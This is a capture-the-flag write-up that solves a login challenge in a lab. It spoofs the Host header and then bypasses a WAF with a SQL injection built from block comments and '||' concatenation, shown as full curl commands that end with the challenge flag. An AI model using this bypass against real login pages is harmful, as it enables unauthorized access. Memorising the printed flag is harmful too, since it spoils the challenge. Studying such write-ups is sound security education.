# Single Sign-on (3 points)

Hi, emergency troubleshooter,

we are preparing a new interface for the single sign-on system, which, on the
recommendation of external pentesters, is now also protected by a WAF. Test the
system to ensure it is secure.

Stay grounded!

* http://login.powergrid.tcc:8080

## Hint

* A WAF was probably just added in front of the old system.

## Solution

We're given URL to explore, but any attempt to access it yields a redirect to
another host

```
$ curl http://login.powergrid.tcc:8080
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://intranet.powergrid.tcc:8080/">here</a>.</p>
</body></html>
```

The problem is, that `intranet.powergrid.tcc` does not exist. Perhaps this host
just checks whether it was accessed via expected route. Let's spoof the `Host`
header to see, if we can convince the server that we're comming from where it
expects.

```
$ curl -H "Host: intranet.powergrid.tcc:8080" http://login.powergrid.tcc:8080
<!DOCTYPE html>
<html lang="en">
<head>
(... output truncated ...)
<body>
    <div class="container">
        <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" fill="#005a9e">
            <path d="M50,5A45,45,0,1,1,5,50,45,45,0,0,1,50,5M50,0a50,50,0,1,0,50,50A50,50,0,0,0,50,0Z"/>
            <path d="M50,25 l-15,30 h30 Z"/>
        </svg>

        <h1>TCC Powergrid</h1>
        <p class="sso-subtitle">Single Sign-On</p>

        <form action="index.php" method="post">
            <input type="text" name="login" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="hidden" name="padding" value="">
            <button type="submit">Sign In</button>
        </form>


        <footer>
            © 2025 TCC Powergrid Corporation. All rights reserved.
        </footer>
    </div>
</body>
</html>
```

We can try submitting various payloads, but when we include `'` (e.g. in
`username` field) the server responds with an error, indicating that the form
might be prone to SQL injection.

```
$ curl -H "Host: intranet.powergrid.tcc:8080" http://login.powergrid.tcc:8080/index.php -d "login=$(urlencode \')&password=$(urlencode PASS)&padding="
(... output truncated ...)
<div class='result error'>Database error: SQLSTATE[HY000]: General error: 1 near "PASS": syntax error</div>
(... output truncated ...)
```

Let's assume that the form is backed by some query that looks like
`SELECT ... WHERE username='${admin}' AND password='${password}'`.

The problem is, that if we include too many special characters in the request,
we get `403` responsem probably from WAF protecting the site. As a result of
that, we cannot send requests with e.g. `admin'--` or `admin' or 1=1` as
username.

```
$ curl -H "Host: intranet.powergrid.tcc:8080" http://login.powergrid.tcc:8080/index.php -d "login=$(urlencode admin)&password=$(urlencode x\' or 1=1)&padding="
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>

$ curl -H "Host: intranet.powergrid.tcc:8080" http://login.powergrid.tcc:8080/index.php -d "login=$(urlencode admin)&password=$(urlencode x\' OR TRUE)&padding="
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
```

After experimenting with various payloads we can figure out, that adding extra
`OR` conditions or attemps to comment out the rest of the query using `--`
won't work, but we can use block comments `/* .. */` and string concatenation
operator`||`.

This will allow us to comment out the password condition, constructing a query
like this:

```sql
SELECT ... WHERE username='admin'||/*' AND password='*/''
```

```
$ curl -H "Host: intranet.powergrid.tcc:8080" http://login.powergrid.tcc:8080/index.php -d "login=$(urlencode "admin'||/*")&password=$(urlencode "*/'")&padding="
(... output truncated ...)
div class='result success'>Login successful! Welcome, admin!</div><div class='result success'><strong>Your Flag:</strong> FLAG{rxRk-Dj3A-bGc0-cyHc}</div>
(... output truncated ...)
```
